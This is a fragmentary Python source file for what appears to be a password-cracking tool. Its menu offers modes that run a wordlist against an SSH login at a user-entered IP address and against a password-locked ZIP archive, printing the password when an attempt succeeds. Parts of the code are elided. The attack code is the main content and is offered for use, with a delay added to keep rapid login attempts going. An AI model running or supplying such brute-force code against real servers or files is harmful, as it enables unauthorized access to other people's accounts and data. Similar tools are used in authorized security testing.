...
###############                 brute force attack a password-locked zip file.
...
def sshBruteForce(username, ipAddress, filePath):
    """
    SSH Brute Force Mode: Attempts to log into an SSH server using the provided username and passwords from the word list.
    """
    wordList = readWordList(filePath)
    if wordList is None:
        return
    ...
    for password in wordList:
        ...
        try:
            ...
            ssh.connect(ipAddress, username=username, password=password, timeout=5)
            print(f"Success! Password for {username}@{ipAddress} is: {password}")
            ssh.close()
            break
            ...
            ssh.close()
            time.sleep(2)  # Adding a delay to handle rapid connection attempts
...
def zipBruteForce(zipFilePath, wordListFilePath):
    """
    ZIP Brute Force Mode: Attempts to unlock a password-protected ZIP file using the provided word list.
    """
    ...
    with zipfile.ZipFile(zipFilePath, 'r') as zip_ref:
        for password in wordList:
            try:
                ...
                print(f"Success! Password for the ZIP file is: {password}")
                break
...
def main():
    """
    Main function: Provides a menu for users to select a mode and processes the user's choice.
    """
    print("   ")
    ...
    while True:
        ...
        if mode == '1':
            ...
            ipAddress = input("Enter SSH IP address: ")
            filePath = input("Enter word list file path: ")
            if os.path.isfile(filePath):
                sshBruteForce(username, ipAddress, filePath)
            else:
                print("Invalid file path. Please try again.")
        elif mode == '5':
            zipFilePath = input("Enter ZIP file path: ")
            wordListFilePath = input("Enter word list file path: ")
            if os.path.isfile(zipFilePath) and os.path.isfile(wordListFilePath):
                zipBruteForce(zipFilePath, wordListFilePath)
            else:
                print("Invalid file path. Please try again.")
        elif mode == '6':
